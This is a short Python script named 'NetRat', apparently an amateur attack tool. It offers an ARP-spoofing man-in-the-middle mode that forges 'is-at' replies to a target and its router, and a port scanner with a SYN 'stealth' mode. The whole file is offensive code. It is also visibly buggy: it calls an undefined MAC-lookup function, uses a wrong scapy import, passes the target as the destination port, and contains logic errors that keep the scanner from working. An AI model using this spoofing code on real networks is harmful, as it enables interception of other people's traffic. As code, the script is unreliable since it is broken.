#!/usr/bin/env python
from scapy import *
import sys
import os
import subprocess
import threading
import socket
import re
import colorama
#importing necesssery libraries that NetRat needs to work properly.

#ip adress signature
ip = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]*$")

#function where is stored the string tutorial that shows how to pass arguments in the commandline.
def needhelp():
    print("""helo""")


def mitm():
    mymac = get_mac_adress()

    try:
        if ip.search(sys.argv[2],sys.argv[3]):
            iprouter = sys.argv[2]
            target = sys.argv[3]
            targetmac = get_mac_adress(ip=target)
            routermac = get_mac_adress(ip=iprouter)

            target_arp_message = ARP(op="is-at",
                                     pdst=target,
                                     hwdst=targetmac,
                                     psrc=iprouter,
                                     hwsrc=mymac
                                     )

            router_arp_message = ARP(op="is-at",
                                     pdst=iprouter,
                                     hwdst=routermac,
                                     psrc=target,
                                     hwsrc=mymac
                                     )
            
            eth = Ether(dst="AA:BB:CC:DD:EE:FF")

            packet1 = eth/target_arp_message
            packet2 = eth/router_arp_message

            sendp(packet1,packet2, iface="eth0")

        else:
            print("[*] Arguments are not valid ip adresses.")
    except:
        print("[*] Invalid arguments.")

    

#function for scaning open ports on target
def netscan():

    #verifying the arguments passed by the user
    try:
        match sys.argv[2]:
            case "-t":
                try:
                    xtime = int(sys.argv[3])
                    target = int(sys.argv[4])
                    portmin = int(sys.argv[5])
                    portmax = int(sys.argv[6])
                except:
                    print("[*] Invalid arguments.")

            case "-q":
                try:
                    stealth = True
                    xtime = 5.0
                    target = int(sys.argv[3])
                    portmin = int(sys.argv[4])
                    portmax = int(sys.argv[5])
                except:
                    print("[*] Invalid arguments.")

            case ip.search(sys.argv[2]) :
                try:
                    xtime = 5.0
                    portmin = int(sys.argv[3])
                    portmax = int(sys.argv[4])
                except:
                    print("[*] Invalid arguments.")

            case _:
                needhelp()
    except:
        print("[*] the second argument is missing.")


    #if argument -q was passed that will activate stealth method of scan which uses just syn packet of verifying if the port is opened or closed.
    if stealth:
        for x in range(portmin,portmax):
            ip = IP(dst=target)
            tcp = TCP(sport=RandShort(), dport=target, flags="S", seq=RandInt(), options=[('MSS', 1460)])
            syn_packet = ip/tcp
            response = sr(syn_packet, verbose=0)
            if response:
                tcp_response = response[0][1]
                if tcp_response.haslayer(TCP) and tcp_response[TCP].flags == "SA":
                    print(f"[*] Port {x} is available! ")
            else:
                print(f"{target} is not responding")
    #else there is the default way to scan for open ports on target
    else:
        for x in range(portmin,portmax):
            connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            socket.setdefaulttimeout(xtime)
            rs = connection.connect_ex((target,x))
            if rs and rs == 0:
                print(f"[*] Port {x} is available! ")
            else:
                print(f"[*] {target} is not responding")

#getting the first argument
try:
    arg1 = sys.argv[1]
except:
    needhelp()
    sys.exit()

#verifying the first argument and setting the right option for what the user has asked.
match arg1:
    case "-mitm":
        mitm()
    case "-s":
        netscan()
    case _:
        needhelp()
        sys.exit()